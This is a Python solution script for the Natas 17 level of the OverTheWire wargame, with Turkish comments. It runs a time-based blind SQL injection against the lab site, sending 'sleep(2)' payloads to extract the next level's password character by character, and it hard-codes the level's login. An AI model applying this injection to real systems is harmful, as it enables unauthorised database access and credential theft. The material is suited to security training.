import requests
from requests.auth import HTTPBasicAuth

allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
filteredchars = ""
passwd = ""

# post formu olduğu için bu header gerekli
headers = {'content-type': 'application/x-www-form-urlencoded'}
Auth = HTTPBasicAuth("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")

for char in allchars: # karakterleri dolaş ve şifredeki karakterleri bul.
    payload = 'username=natas18" AND password LIKE BINARY "%{}%" AND sleep(2) #'.format(char) # 2 saniye bekle
    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php',data=payload, auth=Auth, headers=headers)
    if (r.elapsed.seconds >= 2): # eğer cevap 2 saniyeden sonra gelirse şifrede o karakter var demektir.
        filteredchars += char # karakteri ekle
        print(filteredchars)
print("filteredchars: "+filteredchars)

for _ in range(32):
    for chr in filteredchars:
        payload = 'username=natas18" AND password LIKE BINARY "{}%" AND sleep(2) #'.format(passwd+chr)
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', data=payload, auth=Auth, headers=headers)
        if r.elapsed.seconds >= 2: # eğer 2 saniyeden büyükse şifreye o karakteri ekle.
            passwd += chr
            print(passwd)
            break  # gereksiz deneme yapmaktan kurtarır.
print("password: "+passwd)